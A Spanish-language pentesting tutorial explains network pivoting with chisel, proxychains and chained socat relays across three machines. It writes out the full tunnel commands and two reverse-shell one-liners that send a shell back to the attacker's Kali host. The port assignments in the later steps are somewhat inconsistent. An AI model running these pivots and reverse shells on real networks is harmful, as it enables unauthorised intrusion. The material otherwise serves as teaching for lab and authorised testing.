<h1>CHISEL Y SOCAT</h1>

Son herramientas para poder hacer port forwarding, es decir, redireccionar puertos de una máquina a otra. Con “chisel” conseguiremos tener visibilidad sobre todos los puertos de la máquina 2 y con “socat” conseguiremos que la máquina 2 tenga visibilidad sobre la máquina atacante para poder conseguir una reverse shell.

# **PROCEDIMIENTO:**

1) Primero ponemos chisel a la escucha por el puerto 1234 en la máquina atacante a la espera de un túnel:

- `./chisel server --reverse -p 1234`

2) Transferimos chisel a la máquina 1 y realizamos el portforwarding. Es decir, todo el tráfico que haya en la máquina 2 por el puerto 80 lo redirigimos a nuestra máquina atacante:

- `./chisel client \*ip kali\*:1234 R:socks`

Al poner “socks” podemos ver todo el rango de puertos de la máquina 2 (Para ver sólo el puerto 80 sustituir socks por 80)

3) Se ha establecido una conexión entre la máquina atacante y la máquina 1 a través del puerto 1234. Como podemos ver en la captura se ha creado un túnel en el puerto 1080, para poder acceder a él haremos lo siguiente:

![image](https://github.com/user-attachments/assets/d20ca4bf-4dee-4d63-8439-4dbdd601954d)

- `nano /etc/proxychains4.conf`

4) Abajo del todo añadimos la siguiente línea:

- `socks5 127.0.0.1 1080`

5) A continuación tenemos que establecer el proxy en nuestro navegador para poder ver el contenido, tenemos que cambiar el campo “SOCKS Host” y añadir el puerto del túnel creado:

![image](https://github.com/user-attachments/assets/a2993ec3-fddb-4b51-93ba-2874416cf0ae)

6) Ahora, al escribir la ip de la máquina 2 en nuestro navegador podemos ver el puerto 80 al que antes no teníamos acceso. Si queremos hacer un “nmap” o“gobuster” a la máquina 2 debemos añadir el comando “proxychains” antes.

- `proxychains nmap *ip máquina 2*`
- `proxychains ssh maquina2@*ip*`

7) En este momento podemos ver el contenido de la máquina 2, es decir, podemos acceder vía ssh,http,ftp… Pero la máquina 2 no tiene visibilidad sobre mi máquina, por lo que no podríamos conseguir una reverse shell. Para que la máquina 2 pueda ver nuestro kali hay que descargar y ejecutar socat en la máquina 1.

- `./socat tcp-l:1111,fork,reuseaddr tcp:*ip kali*:111`

Al ejecutarlo, la máquina 1 está esperando una conexión por el puerto 1111 y todo lo que le llegue por este puerto, lo va a enviar a la máquina atacante por el puerto 111. A su vez, la máquina atacante estará a la escucha por el puerto 111 para recibir la reverse shell.

8) Para probar que podemos conseguir una reverse shell entramos a la máquina 2 por ssh con proxychains (disponemos de credenciales) y ejecutamos lo siguiente:

- `sh -i >& /dev/tcp/*ip máquina 1*/1111 0>&1`

(La ip de la máquina 1 que tenemos que poner es la interfaz que tiene visión con la máquina 2. Como todo el contenido del puerto 1111 de la máquina 1 lo redirige al puerto 111 de la máquina atacante)

# **RESUMEN:**

- Servidor chisel en kali
- Cliente chisel en máquina 1
- Modificar /etc/proxychains
- Proxy en firefox si queremos ver el contenido desde el navegador
- Socat en máquina 1 para redireccionar los puertos

# **AÑADIMOS UNA MÁQUINA 3**

9) Ahora tenemos visibilidad sobre la máquina 2 y esta tiene visión sobre nosotros y nuestro objetivo es hacer lo mismo con la máquina 3. Para ello tenemos que enviar “socat” y “chisel” a la máquina 2.

10) En la máquina 1 ejecutamos socat de la siguiente manera:

- `./socat tcp-l:2222,fork,reuseaddr tcp:*ip kali*:1234`

(Todo lo que la máquina 1 reciba por el puerto 2222, lo envia al puerto 1234 de la máquina kali, que es el puerto donde esta el servidor chisel a la escucha)

11) En la máquina 2 ejecutamos chisel de la siguiente manera (Como socks ya esta utilizando el puerto 1080 ponemos 5555 para crear otro tunel proxy):

- `./chisel client *ip maquina 1*:2222 R:5555:socks`

# **EXPLICACIÓN**

Chisel necesita establecer un túnel desde la máquina 2 hasta nuestro kali para tener vision sobre la maquina 3, para ello tenemos que redirigir los puertos con socat desde la máquina 1 y creamos el túnel desde la máquina 2

12) Ahora hay que editar de nuevo el archivo “/etc/proxychains”. Hay que fijarse que “dynamic_chain” este descomentado y “strict_chain” esté comentado y añadimos lo siguiente ENCIMA DE LA LÍNEA ANTERIOR

- `socks5 127.0.0.1 5555`

13) Como hemos hecho anteriormente, para poder ver el contenido de la máquina 3 en el navegador debemos modificar el proxy de firefox:

![image](https://github.com/user-attachments/assets/8f94ecd8-490b-4033-b98f-7a1e23a1368f)

14) Ahora podemos ver el contenido de la máquina 3 en nuestro navegador pero tenemos el mismo problema que antes: Tenemos visibilidad sobre la máquina 3 pero la máquina 3 no tiene visibilidad sobre nosotros, por lo que no podríamos conseguir una reverse shell. Para ello, utilizaremos socat en la máquina 2:

- `./socat tcp-l:3333,fork,reuseaddr tcp:*ip máquina 1*:4000`

15) En la máquina 1 también tenemos que crear otra instancia de socat:

- `./socat tcp-l:4000,fork,reuseaddr tcp:*ip kali*:2222`

16) Ahora, si ejecutamos una reverse shell al puerto 3333 de la maquina 2 conseguiremos un reverse shell.

- `sh -i >& /dev/tcp/*maquina 2*/3333 0>&1`

# **RESUMEN**

\- Estoy enviando una reverse shell al puerto 3333 de la máquina 2

\- La máquina 2 recibe la conexión por el puerto 3333 y la envía al puerto 4000 de la máquina 1

\- La máquina 1 recibe la conexión por el puerto 4000 y la envía al puerto 2222 de la máquina kali

\- La máquina kali está a la escucha con netcat por el puerto 2222 para recibir la conexión
